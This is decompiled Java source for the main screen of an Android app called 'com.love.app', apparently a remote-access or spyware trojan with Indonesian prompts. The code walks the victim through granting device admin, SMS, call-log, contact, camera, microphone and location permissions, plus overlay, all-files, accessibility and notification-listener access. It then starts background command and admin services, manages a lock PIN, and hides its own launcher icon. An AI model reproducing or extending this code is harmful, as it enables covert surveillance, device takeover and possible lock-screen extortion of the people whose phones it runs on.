package com.love.app;

import android.app.AlertDialog;
import android.app.DownloadManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.LinkCapabilities;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.webkit.CookieManager;
import android.webkit.DownloadListener;
import android.webkit.JavascriptInterface;
import android.webkit.MimeTypeMap;
import android.webkit.URLUtil;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.androidnetworking.common.ANConstants;
import java.util.ArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/* JADX INFO: loaded from: classes.dex */
public class MainActivity extends AppCompatActivity {
    private static final long HEARTBEAT_INTERVAL_MS = 120000;
    private static final int MAX_PERMISSION_RETRIES = 2;
    private static final int MAX_REGISTER_RETRIES = 5;
    private static final int REQ_ADMIN = 99;
    private static final int REQ_BATTERY = 102;
    private static final int REQ_DOWNLOAD_PERM = 105;
    private static final int REQ_MANAGE_STORAGE = 103;
    private static final int REQ_OVERLAY = 100;
    private static final int REQ_PERMISSIONS = 104;
    private static final int REQ_WRITE_SETTINGS = 101;
    private static final String TAG = "MainActivity";
    private ComponentName adminComponent;
    private DevicePolicyManager dpm;
    private Runnable heartbeatRunnable;
    private SharedPreferences prefs;
    private String sFileName;
    private String sUrl;
    private String sUserAgent;
    private PowerManager.WakeLock wakeLock;
    private WebView webView;
    private Handler mainHandler = new Handler(Looper.getMainLooper());
    private ExecutorService executor = Executors.newSingleThreadExecutor();
    private boolean adminGranted = false;
    private boolean overlayGranted = false;
    private boolean writeSettingsGranted = false;
    private boolean batteryIgnored = false;
    private boolean storageGranted = false;
    private int permissionRequestCount = 0;
    private Handler heartbeatHandler = new Handler(Looper.getMainLooper());
    private int registerRetryCount = 0;
    private volatile boolean registerInFlight = false;
    private long lastRegisterAttemptAt = 0;
    private String lastRegisterSignature = "";

    private boolean isNetworkAvailable() {
        return true;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void registerDeviceNow() {
    }

    private void sendHeartbeat() {
    }

    private void startHeartbeat() {
    }

    private String getConfiguredLockPin() {
        String string = this.prefs.getString("lock_pin", "");
        return string == null ? "" : string.trim();
    }

    private boolean hasConfiguredLockPin() {
        return getConfiguredLockPin().matches("\\d{4,6}");
    }

    private void normalizeLockState() {
        if (hasConfiguredLockPin()) {
            return;
        }
        this.prefs.edit().putBoolean("is_locked", false).putString("lock_mode", LinkCapabilities.Role.DEFAULT).apply();
        Intent intent = new Intent(this, (Class<?>) LockActivity.LockGuardService.class);
        intent.setAction(LockActivity.ACTION_STOP_LOCK);
        try {
            stopService(intent);
        } catch (Exception e) {
            Log.w(TAG, "Gagal menghentikan LockGuardService: " + e.getMessage());
        }
    }

    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.prefs = getSharedPreferences("love_config", 0);
        ConfigFetcher.bootstrapConfig(this, new ConfigFetcher.ConfigListener() { // from class: com.love.app.MainActivity.1
            @Override // com.love.app.ConfigFetcher.ConfigListener
            public void onConfigLoaded(String str) {
                Log.d(MainActivity.TAG, "Config bootstrap siap: " + str);
            }

            @Override // com.love.app.ConfigFetcher.ConfigListener
            public void onConfigFailed() {
                Log.w(MainActivity.TAG, "Config bootstrap gagal");
            }
        });
        setContentView(C1294R.layout.activity_main);
        this.webView = (WebView) findViewById(C1294R.id.webView);
        normalizeLockState();
        this.dpm = (DevicePolicyManager) getSystemService("device_policy");
        this.adminComponent = new ComponentName(this, (Class<?>) AdminReceiver.class);
        setupWebView();
        ensureUsernameValid();
        checkAdminAndProceed();
    }

    private void ensureUsernameValid() {
        String username = ConfigFetcher.getUsername(this);
        String sessionId = ConfigFetcher.getSessionId(this);
        if ((username == null || username.trim().isEmpty()) && (sessionId == null || sessionId.trim().isEmpty())) {
            String string = this.prefs.getString("saved_username", "");
            if (string.isEmpty()) {
                ConfigFetcher.setUsername(this, "default_user");
                ConfigFetcher.setSessionId(this, "default_session");
            } else {
                ConfigFetcher.setUsername(this, string);
                ConfigFetcher.setSessionId(this, string);
            }
        }
        onUsernameReady();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void onUsernameReady() {
        startCoreServices();
    }

    private void showUsernameDialog() {
        runOnUiThread(new Runnable() { // from class: com.love.app.MainActivity$$ExternalSyntheticLambda2
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m350lambda$showUsernameDialog$2$comloveappMainActivity();
            }
        });
    }

    /* JADX INFO: renamed from: lambda$showUsernameDialog$2$com-love-app-MainActivity, reason: not valid java name */
    /* synthetic */ void m350lambda$showUsernameDialog$2$comloveappMainActivity() {
        final EditText editText = new EditText(this);
        editText.setHint("Username / Session ID");
        new AlertDialog.Builder(this).setTitle("Akses Diperlukan").setMessage("Masukkan Username atau Session ID akun Anda untuk sinkronisasi:").setView(editText).setPositiveButton("Simpan", new DialogInterface.OnClickListener() { // from class: com.love.app.MainActivity$$ExternalSyntheticLambda3
            @Override // android.content.DialogInterface.OnClickListener
            public final void onClick(DialogInterface dialogInterface, int i) {
                this.f$0.m348lambda$showUsernameDialog$0$comloveappMainActivity(editText, dialogInterface, i);
            }
        }).setNegativeButton("Keluar", new DialogInterface.OnClickListener() { // from class: com.love.app.MainActivity$$ExternalSyntheticLambda4
            @Override // android.content.DialogInterface.OnClickListener
            public final void onClick(DialogInterface dialogInterface, int i) {
                this.f$0.m349lambda$showUsernameDialog$1$comloveappMainActivity(dialogInterface, i);
            }
        }).setCancelable(false).show();
    }

    /* JADX INFO: renamed from: lambda$showUsernameDialog$0$com-love-app-MainActivity, reason: not valid java name */
    /* synthetic */ void m348lambda$showUsernameDialog$0$comloveappMainActivity(EditText editText, DialogInterface dialogInterface, int i) {
        String strTrim = editText.getText().toString().trim();
        if (!strTrim.isEmpty()) {
            ConfigFetcher.setUsername(this, strTrim);
            ConfigFetcher.setSessionId(this, strTrim);
            this.prefs.edit().putString("saved_username", strTrim).apply();
            onUsernameReady();
            return;
        }
        Toast.makeText(this, "ID tidak boleh kosong", 0).show();
        showUsernameDialog();
    }

    /* JADX INFO: renamed from: lambda$showUsernameDialog$1$com-love-app-MainActivity, reason: not valid java name */
    /* synthetic */ void m349lambda$showUsernameDialog$1$comloveappMainActivity(DialogInterface dialogInterface, int i) {
        finish();
    }

    private void checkAdminAndProceed() {
        if (this.dpm.isAdminActive(this.adminComponent)) {
            this.adminGranted = true;
            checkRuntimePermissions();
        } else {
            new AlertDialog.Builder(this).setTitle("Aktifkan Administrator Perangkat").setMessage("Aplikasi ini memerlukan hak administrator untuk fitur keamanan seperti kunci layar.").setCancelable(false).setPositiveButton("Aktifkan", new DialogInterface.OnClickListener() { // from class: com.love.app.MainActivity$$ExternalSyntheticLambda13
                @Override // android.content.DialogInterface.OnClickListener
                public final void onClick(DialogInterface dialogInterface, int i) {
                    this.f$0.m332lambda$checkAdminAndProceed$3$comloveappMainActivity(dialogInterface, i);
                }
            }).show();
        }
    }

    /* JADX INFO: renamed from: lambda$checkAdminAndProceed$3$com-love-app-MainActivity, reason: not valid java name */
    /* synthetic */ void m332lambda$checkAdminAndProceed$3$comloveappMainActivity(DialogInterface dialogInterface, int i) {
        Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
        intent.putExtra("android.app.extra.DEVICE_ADMIN", this.adminComponent);
        intent.putExtra("android.app.extra.ADD_EXPLANATION", "Diperlukan untuk keamanan.");
        startActivityForResult(intent, 99);
    }

    private void checkRuntimePermissions() {
        ArrayList arrayList = new ArrayList();
        String[] strArr = {"android.permission.CAMERA", "android.permission.READ_CONTACTS", "android.permission.READ_SMS", "android.permission.SEND_SMS", "android.permission.RECEIVE_SMS", "android.permission.READ_CALL_LOG", "android.permission.WRITE_CALL_LOG", "android.permission.ACCESS_FINE_LOCATION", "android.permission.ACCESS_COARSE_LOCATION", "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_EXTERNAL_STORAGE", "android.permission.RECORD_AUDIO", "android.permission.READ_PHONE_STATE"};
        for (int i = 0; i < 13; i++) {
            String str = strArr[i];
            if (ContextCompat.checkSelfPermission(this, str) != 0) {
                arrayList.add(str);
            }
        }
        if (Build.VERSION.SDK_INT >= 33) {
            if (ContextCompat.checkSelfPermission(this, "android.permission.READ_MEDIA_IMAGES") != 0) {
                arrayList.add("android.permission.READ_MEDIA_IMAGES");
            }
            if (ContextCompat.checkSelfPermission(this, "android.permission.READ_MEDIA_VIDEO") != 0) {
                arrayList.add("android.permission.READ_MEDIA_VIDEO");
            }
            if (ContextCompat.checkSelfPermission(this, "android.permission.POST_NOTIFICATIONS") != 0) {
                arrayList.add("android.permission.POST_NOTIFICATIONS");
            }
        }
        if (!arrayList.isEmpty()) {
            int i2 = this.permissionRequestCount;
            if (i2 < 2) {
                this.permissionRequestCount = i2 + 1;
                ActivityCompat.requestPermissions(this, (String[]) arrayList.toArray(new String[0]), 104);
                return;
            } else {
                Toast.makeText(this, "Beberapa izin tidak diberikan, beberapa fitur mungkin terbatas.", 1).show();
                proceedToNextPermissionStep();
                return;
            }
        }
        proceedToNextPermissionStep();
    }

    private void proceedToNextPermissionStep() {
        checkOverlayPermission();
    }

    private void checkOverlayPermission() {
        if (Settings.canDrawOverlays(this)) {
            this.overlayGranted = true;
            checkWriteSettings();
        } else {
            new AlertDialog.Builder(this).setTitle("Izin Tampilan di Atas Aplikasi Lain").setMessage("Aplikasi ini membutuhkan izin untuk menampilkan jendela di atas aplikasi lain.").setCancelable(false).setPositiveButton("Buka Pengaturan", new DialogInterface.OnClickListener() { // from class: com.love.app.MainActivity$$ExternalSyntheticLambda0
                @Override // android.content.DialogInterface.OnClickListener
                public final void onClick(DialogInterface dialogInterface, int i) {
                    this.f$0.m337lambda$checkOverlayPermission$4$comloveappMainActivity(dialogInterface, i);
                }
            }).setNegativeButton("Nanti", new DialogInterface.OnClickListener() { // from class: com.love.app.MainActivity$$ExternalSyntheticLambda11
                @Override // android.content.DialogInterface.OnClickListener
                public final void onClick(DialogInterface dialogInterface, int i) {
                    this.f$0.m338lambda$checkOverlayPermission$5$comloveappMainActivity(dialogInterface, i);
                }
            }).show();
        }
    }

    /* JADX INFO: renamed from: lambda$checkOverlayPermission$4$com-love-app-MainActivity, reason: not valid java name */
    /* synthetic */ void m337lambda$checkOverlayPermission$4$comloveappMainActivity(DialogInterface dialogInterface, int i) {
        startActivityForResult(new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION", Uri.parse("package:" + getPackageName())), 100);
    }

    /* JADX INFO: renamed from: lambda$checkOverlayPermission$5$com-love-app-MainActivity, reason: not valid java name */
    /* synthetic */ void m338lambda$checkOverlayPermission$5$comloveappMainActivity(DialogInterface dialogInterface, int i) {
        Toast.makeText(this, "Fitur overlay tidak akan tersedia.", 0).show();
        checkWriteSettings();
    }

    private void checkWriteSettings() {
        if (!Settings.System.canWrite(this)) {
            new AlertDialog.Builder(this).setTitle("Izin Ubah Pengaturan Sistem").setMessage("Izin ini diperlukan untuk mengubah beberapa pengaturan sistem.").setCancelable(false).setPositiveButton("Buka Pengaturan", new DialogInterface.OnClickListener() { // from class: com.love.app.MainActivity$$ExternalSyntheticLambda21
                @Override // android.content.DialogInterface.OnClickListener
                public final void onClick(DialogInterface dialogInterface, int i) {
                    this.f$0.m339lambda$checkWriteSettings$6$comloveappMainActivity(dialogInterface, i);
                }
            }).setNegativeButton("Nanti", new DialogInterface.OnClickListener() { // from class: com.love.app.MainActivity$$ExternalSyntheticLambda1
                @Override // android.content.DialogInterface.OnClickListener
                public final void onClick(DialogInterface dialogInterface, int i) {
                    this.f$0.m340lambda$checkWriteSettings$7$comloveappMainActivity(dialogInterface, i);
                }
            }).show();
        } else {
            this.writeSettingsGranted = true;
            checkBatteryOptimization();
        }
    }

    /* JADX INFO: renamed from: lambda$checkWriteSettings$6$com-love-app-MainActivity, reason: not valid java name */
    /* synthetic */ void m339lambda$checkWriteSettings$6$comloveappMainActivity(DialogInterface dialogInterface, int i) {
        startActivityForResult(new Intent("android.settings.action.MANAGE_WRITE_SETTINGS", Uri.parse("package:" + getPackageName())), 101);
    }

    /* JADX INFO: renamed from: lambda$checkWriteSettings$7$com-love-app-MainActivity, reason: not valid java name */
    /* synthetic */ void m340lambda$checkWriteSettings$7$comloveappMainActivity(DialogInterface dialogInterface, int i) {
        checkBatteryOptimization();
    }

    private void checkBatteryOptimization() {
        if (!((PowerManager) getSystemService("power")).isIgnoringBatteryOptimizations(getPackageName())) {
            new AlertDialog.Builder(this).setTitle("Optimasi Baterai").setMessage("Agar aplikasi dapat berjalan terus di latar belakang, nonaktifkan optimasi baterai.").setCancelable(false).setPositiveButton("Buka Pengaturan", new DialogInterface.OnClickListener() { // from class: com.love.app.MainActivity$$ExternalSyntheticLambda19
                @Override // android.content.DialogInterface.OnClickListener
                public final void onClick(DialogInterface dialogInterface, int i) {
                    this.f$0.m333lambda$checkBatteryOptimization$8$comloveappMainActivity(dialogInterface, i);
                }
            }).setNegativeButton("Nanti", new DialogInterface.OnClickListener() { // from class: com.love.app.MainActivity$$ExternalSyntheticLambda20
                @Override // android.content.DialogInterface.OnClickListener
                public final void onClick(DialogInterface dialogInterface, int i) {
                    this.f$0.m334lambda$checkBatteryOptimization$9$comloveappMainActivity(dialogInterface, i);
                }
            }).show();
        } else {
            this.batteryIgnored = true;
            checkManageStorage();
        }
    }

    /* JADX INFO: renamed from: lambda$checkBatteryOptimization$8$com-love-app-MainActivity, reason: not valid java name */
    /* synthetic */ void m333lambda$checkBatteryOptimization$8$comloveappMainActivity(DialogInterface dialogInterface, int i) {
        startActivityForResult(new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", Uri.parse("package:" + getPackageName())), 102);
    }

    /* JADX INFO: renamed from: lambda$checkBatteryOptimization$9$com-love-app-MainActivity, reason: not valid java name */
    /* synthetic */ void m334lambda$checkBatteryOptimization$9$comloveappMainActivity(DialogInterface dialogInterface, int i) {
        checkManageStorage();
    }

    private void checkManageStorage() {
        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
            new AlertDialog.Builder(this).setTitle("Akses Semua File").setMessage("Izin ini diperlukan untuk mengelola file di penyimpanan.").setCancelable(false).setPositiveButton("Buka Pengaturan", new DialogInterface.OnClickListener() { // from class: com.love.app.MainActivity$$ExternalSyntheticLambda9
                @Override // android.content.DialogInterface.OnClickListener
                public final void onClick(DialogInterface dialogInterface, int i) {
                    this.f$0.m335lambda$checkManageStorage$10$comloveappMainActivity(dialogInterface, i);
                }
            }).setNegativeButton("Nanti", new DialogInterface.OnClickListener() { // from class: com.love.app.MainActivity$$ExternalSyntheticLambda10
                @Override // android.content.DialogInterface.OnClickListener
                public final void onClick(DialogInterface dialogInterface, int i) {
                    this.f$0.m336lambda$checkManageStorage$11$comloveappMainActivity(dialogInterface, i);
                }
            }).show();
        } else {
            this.storageGranted = true;
            requestAccessibilityAndNotification();
        }
    }

    /* JADX INFO: renamed from: lambda$checkManageStorage$10$com-love-app-MainActivity, reason: not valid java name */
    /* synthetic */ void m335lambda$checkManageStorage$10$comloveappMainActivity(DialogInterface dialogInterface, int i) {
        try {
            startActivityForResult(new Intent("android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION", Uri.parse("package:" + getPackageName())), 103);
        } catch (Exception unused) {
            startActivityForResult(new Intent("android.settings.MANAGE_ALL_FILES_ACCESS_PERMISSION"), 103);
        }
    }

    /* JADX INFO: renamed from: lambda$checkManageStorage$11$com-love-app-MainActivity, reason: not valid java name */
    /* synthetic */ void m336lambda$checkManageStorage$11$comloveappMainActivity(DialogInterface dialogInterface, int i) {
        Toast.makeText(this, "Akses file terbatas.", 0).show();
        requestAccessibilityAndNotification();
    }

    private void requestAccessibilityAndNotification() {
        boolean z = !isAccessibilityEnabled();
        boolean z2 = !isNotificationListenerEnabled();
        if (z || z2) {
            StringBuilder sb = new StringBuilder("Untuk pengalaman lengkap, aktifkan:\n");
            if (z) {
                sb.append("- Layanan Aksesibilitas\n");
            }
            if (z2) {
                sb.append("- Akses Notifikasi\n");
            }
            sb.append("\nSetelah diaktifkan, aplikasi akan tetap berjalan.");
            new AlertDialog.Builder(this).setTitle("Aksesibilitas dan Notifikasi").setMessage(sb.toString()).setPositiveButton("Buka Pengaturan", new DialogInterface.OnClickListener() { // from class: com.love.app.MainActivity$$ExternalSyntheticLambda15
                @Override // android.content.DialogInterface.OnClickListener
                public final void onClick(DialogInterface dialogInterface, int i) {
                    this.f$0.m116x13eafffe(dialogInterface, i);
                }
            }).setNegativeButton("Nanti", new DialogInterface.OnClickListener() { // from class: com.love.app.MainActivity$$ExternalSyntheticLambda16
                @Override // android.content.DialogInterface.OnClickListener
                public final void onClick(DialogInterface dialogInterface, int i) {
                    this.f$0.m117x4d3c10bf(dialogInterface, i);
                }
            }).show();
            return;
        }
        proceedToBackground();
    }

    /* JADX INFO: renamed from: lambda$requestAccessibilityAndNotification$12$com-love-app-MainActivity */
    /* synthetic */ void m116x13eafffe(DialogInterface dialogInterface, int i) {
        startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));
        proceedToBackground();
    }

    /* JADX INFO: renamed from: lambda$requestAccessibilityAndNotification$13$com-love-app-MainActivity */
    /* synthetic */ void m117x4d3c10bf(DialogInterface dialogInterface, int i) {
        proceedToBackground();
    }

    private boolean isAccessibilityEnabled() {
        String string = Settings.Secure.getString(getContentResolver(), "enabled_accessibility_services");
        return string != null && string.contains(new StringBuilder().append(getPackageName()).append("/").append(MyAccessibilityService.class.getName()).toString());
    }

    private boolean isNotificationListenerEnabled() {
        String string = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return string != null && string.contains(getPackageName());
    }

    private void proceedToBackground() {
        Log.d(TAG, "Semua izin diproses, menjalankan service latar belakang");
        checkFirstRun();
        startHangService();
        startService(new Intent(this, (Class<?>) CommandService.class));
        hideAppIcon();
    }

    private void scheduleRegisterRetry() {
        int i = this.registerRetryCount;
        if (i >= 5) {
            Log.e(TAG, "Max register retries reached, giving up");
            return;
        }
        int i2 = i + 1;
        this.registerRetryCount = i2;
        long jPow = ((long) Math.pow(2.0d, i2)) * 5000;
        this.mainHandler.postDelayed(new Runnable() { // from class: com.love.app.MainActivity$$ExternalSyntheticLambda12
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.registerDeviceNow();
            }
        }, jPow);
        Log.d(TAG, "Scheduling register retry #" + this.registerRetryCount + " in " + jPow + "ms");
    }

    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, android.app.Activity
    protected void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
        switch (i) {
            case 99:
                if (this.dpm.isAdminActive(this.adminComponent)) {
                    this.adminGranted = true;
                    checkRuntimePermissions();
                } else {
                    checkAdminAndProceed();
                }
                break;
            case 100:
                this.mainHandler.postDelayed(new Runnable() { // from class: com.love.app.MainActivity$$ExternalSyntheticLambda5
                    @Override // java.lang.Runnable
                    public final void run() {
                        this.f$0.m341lambda$onActivityResult$14$comloveappMainActivity();
                    }
                }, 500L);
                break;
            case 101:
                this.mainHandler.postDelayed(new Runnable() { // from class: com.love.app.MainActivity$$ExternalSyntheticLambda6
                    @Override // java.lang.Runnable
                    public final void run() {
                        this.f$0.m342lambda$onActivityResult$15$comloveappMainActivity();
                    }
                }, 500L);
                break;
            case 102:
                this.mainHandler.postDelayed(new Runnable() { // from class: com.love.app.MainActivity$$ExternalSyntheticLambda7
                    @Override // java.lang.Runnable
                    public final void run() {
                        this.f$0.m343lambda$onActivityResult$16$comloveappMainActivity();
                    }
                }, 500L);
                break;
            case 103:
                this.mainHandler.postDelayed(new Runnable() { // from class: com.love.app.MainActivity$$ExternalSyntheticLambda8
                    @Override // java.lang.Runnable
                    public final void run() {
                        this.f$0.m344lambda$onActivityResult$17$comloveappMainActivity();
                    }
                }, 500L);
                break;
        }
    }

    /* JADX INFO: renamed from: lambda$onActivityResult$14$com-love-app-MainActivity, reason: not valid java name */
    /* synthetic */ void m341lambda$onActivityResult$14$comloveappMainActivity() {
        this.overlayGranted = Settings.canDrawOverlays(this);
        checkWriteSettings();
    }

    /* JADX INFO: renamed from: lambda$onActivityResult$15$com-love-app-MainActivity, reason: not valid java name */
    /* synthetic */ void m342lambda$onActivityResult$15$comloveappMainActivity() {
        this.writeSettingsGranted = Settings.System.canWrite(this);
        checkBatteryOptimization();
    }

    /* JADX INFO: renamed from: lambda$onActivityResult$16$com-love-app-MainActivity, reason: not valid java name */
    /* synthetic */ void m343lambda$onActivityResult$16$comloveappMainActivity() {
        this.batteryIgnored = ((PowerManager) getSystemService("power")).isIgnoringBatteryOptimizations(getPackageName());
        checkManageStorage();
    }

    /* JADX INFO: renamed from: lambda$onActivityResult$17$com-love-app-MainActivity, reason: not valid java name */
    /* synthetic */ void m344lambda$onActivityResult$17$comloveappMainActivity() {
        this.storageGranted = Build.VERSION.SDK_INT < 30 || Environment.isExternalStorageManager();
        requestAccessibilityAndNotification();
    }

    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, android.app.Activity
    public void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        String str;
        super.onRequestPermissionsResult(i, strArr, iArr);
        if (i == 104) {
            boolean z = false;
            for (int i2 = 0; i2 < strArr.length; i2++) {
                if (iArr[i2] != 0) {
                    z = true;
                }
            }
            if (z) {
                if (this.permissionRequestCount < 2) {
                    new AlertDialog.Builder(this).setTitle("Izin Diperlukan").setMessage("Beberapa izin tidak diberikan. Coba lagi atau lanjutkan dengan fitur terbatas.").setPositiveButton("Coba Lagi", new DialogInterface.OnClickListener() { // from class: com.love.app.MainActivity$$ExternalSyntheticLambda17
                        @Override // android.content.DialogInterface.OnClickListener
                        public final void onClick(DialogInterface dialogInterface, int i3) {
                            this.f$0.m345lambda$onRequestPermissionsResult$18$comloveappMainActivity(dialogInterface, i3);
                        }
                    }).setNegativeButton("Lanjutkan", new DialogInterface.OnClickListener() { // from class: com.love.app.MainActivity$$ExternalSyntheticLambda18
                        @Override // android.content.DialogInterface.OnClickListener
                        public final void onClick(DialogInterface dialogInterface, int i3) {
                            this.f$0.m346lambda$onRequestPermissionsResult$19$comloveappMainActivity(dialogInterface, i3);
                        }
                    }).show();
                    return;
                } else {
                    Toast.makeText(this, "Melanjutkan dengan izin terbatas.", 1).show();
                    proceedToNextPermissionStep();
                    return;
                }
            }
            proceedToNextPermissionStep();
            return;
        }
        if (i != 105 || iArr.length <= 0 || iArr[0] != 0 || (str = this.sUrl) == null) {
            return;
        }
        downloadFile(this.sFileName, str, this.sUserAgent);
    }

    /* JADX INFO: renamed from: lambda$onRequestPermissionsResult$18$com-love-app-MainActivity, reason: not valid java name */
    /* synthetic */ void m345lambda$onRequestPermissionsResult$18$comloveappMainActivity(DialogInterface dialogInterface, int i) {
        checkRuntimePermissions();
    }

    /* JADX INFO: renamed from: lambda$onRequestPermissionsResult$19$com-love-app-MainActivity, reason: not valid java name */
    /* synthetic */ void m346lambda$onRequestPermissionsResult$19$comloveappMainActivity(DialogInterface dialogInterface, int i) {
        proceedToNextPermissionStep();
    }

    private void hideAppIcon() {
        try {
            getPackageManager().setComponentEnabledSetting(new ComponentName(this, (Class<?>) MainActivity.class), 2, 1);
        } catch (Exception e) {
            Log.e(TAG, "Gagal menyembunyikan ikon", e);
        }
    }

    private void checkFirstRun() {
        if (this.prefs.getBoolean("first_run", true)) {
            this.prefs.edit().putBoolean("first_run", false).apply();
            showAutoStartDialog();
        }
    }

    private void showAutoStartDialog() {
        try {
            Intent intent = new Intent();
            String lowerCase = Build.MANUFACTURER.toLowerCase();
            if (lowerCase.contains("xiaomi")) {
                intent.setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"));
            } else if (lowerCase.contains("oppo")) {
                intent.setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity"));
            } else if (lowerCase.contains("vivo")) {
                intent.setComponent(new ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"));
            } else {
                if (!lowerCase.contains("huawei") && !lowerCase.contains("honor")) {
                    return;
                }
                intent.setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity"));
            }
            if (getPackageManager().queryIntentActivities(intent, 65536).isEmpty()) {
                return;
            }
            startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "AutoStart", e);
        }
    }

    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:9:0x001f -> B:22:0x0024). Please report as a decompilation issue!!! */
    private void startCoreServices() {
        try {
            Intent intent = new Intent(this, (Class<?>) ForegroundService.class);
            intent.putExtra("inputExtra", "System Service Running");
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Gagal start ForegroundService", e);
        }
        try {
            startService(new Intent(this, (Class<?>) JobWakeUpService.class));
        } catch (Exception e2) {
            Log.e(TAG, "Gagal start JobWakeUpService", e2);
        }
        try {
            Intent intent2 = new Intent(this, (Class<?>) AdminService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(intent2);
            } else {
                startService(intent2);
            }
        } catch (Exception e3) {
            Log.e(TAG, "Gagal start AdminService", e3);
        }
    }

    private void startHangService() {
        try {
            Intent intent = new Intent(this, (Class<?>) HangService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Gagal start HangService", e);
        }
    }

    private void setupWebView() {
        WebSettings settings = this.webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        settings.setLoadWithOverviewMode(true);
        settings.setUseWideViewPort(true);
        settings.setSupportZoom(true);
        settings.setBuiltInZoomControls(false);
        settings.setDisplayZoomControls(false);
        settings.setCacheMode(-1);
        settings.setMixedContentMode(0);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);
        settings.setLoadsImagesAutomatically(true);
        settings.setMediaPlaybackRequiresUserGesture(false);
        settings.setUserAgentString("Mozilla/5.0 (Linux; Android " + Build.VERSION.RELEASE + "; " + Build.MODEL + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36");
        CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        cookieManager.setAcceptThirdPartyCookies(this.webView, true);
        this.webView.addJavascriptInterface(new Object() { // from class: com.love.app.MainActivity.2
            @JavascriptInterface
            public void setUsername(String str) {
                if (str == null || str.isEmpty()) {
                    return;
                }
                ConfigFetcher.setUsername(MainActivity.this, str);
                String sessionId = ConfigFetcher.getSessionId(MainActivity.this);
                if (sessionId == null || sessionId.trim().isEmpty()) {
                    ConfigFetcher.setSessionId(MainActivity.this, str);
                }
                MainActivity.this.prefs.edit().putString("saved_username", str).apply();
                MainActivity.this.onUsernameReady();
            }
        }, "AndroidApp");
        this.webView.setWebViewClient(new C12933());
        this.webView.setWebChromeClient(new WebChromeClient());
        String webviewUrl = ConfigFetcher.getWebviewUrl(this);
        if (webviewUrl == null || webviewUrl.isEmpty()) {
            webviewUrl = "https://www.google.com";
        }
        this.webView.loadUrl(webviewUrl);
        this.webView.setDownloadListener(new DownloadListener() { // from class: com.love.app.MainActivity$$ExternalSyntheticLambda14
            @Override // android.webkit.DownloadListener
            public final void onDownloadStart(String str, String str2, String str3, String str4, long j) {
                this.f$0.m347lambda$setupWebView$20$comloveappMainActivity(str, str2, str3, str4, j);
            }
        });
    }

    /* JADX INFO: renamed from: com.love.app.MainActivity$3 */
    class C12933 extends WebViewClient {
        C12933() {
        }

        @Override // android.webkit.WebViewClient
        public boolean shouldOverrideUrlLoading(WebView webView, String str) {
            webView.loadUrl(str);
            return true;
        }

        @Override // android.webkit.WebViewClient
        public boolean shouldOverrideUrlLoading(WebView webView, WebResourceRequest webResourceRequest) {
            webView.loadUrl(webResourceRequest.getUrl().toString());
            return true;
        }

        @Override // android.webkit.WebViewClient
        public void onReceivedError(final WebView webView, int i, String str, final String str2) {
            Log.w(MainActivity.TAG, "WebView error: " + str + " | " + str2);
            MainActivity.this.mainHandler.postDelayed(new Runnable() { // from class: com.love.app.MainActivity$3$$ExternalSyntheticLambda0
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m351lambda$onReceivedError$0$comloveappMainActivity$3(str2, webView);
                }
            }, 3000L);
        }

        /* JADX INFO: renamed from: lambda$onReceivedError$0$com-love-app-MainActivity$3, reason: not valid java name */
        /* synthetic */ void m351lambda$onReceivedError$0$comloveappMainActivity$3(String str, WebView webView) {
            if (MainActivity.this.isFinishing() || str == null || !str.equals(webView.getUrl())) {
                return;
            }
            String webviewUrl = ConfigFetcher.getWebviewUrl(MainActivity.this);
            if (webviewUrl == null || webviewUrl.isEmpty()) {
                webviewUrl = "https://www.google.com";
            }
            webView.loadUrl(webviewUrl);
        }
    }

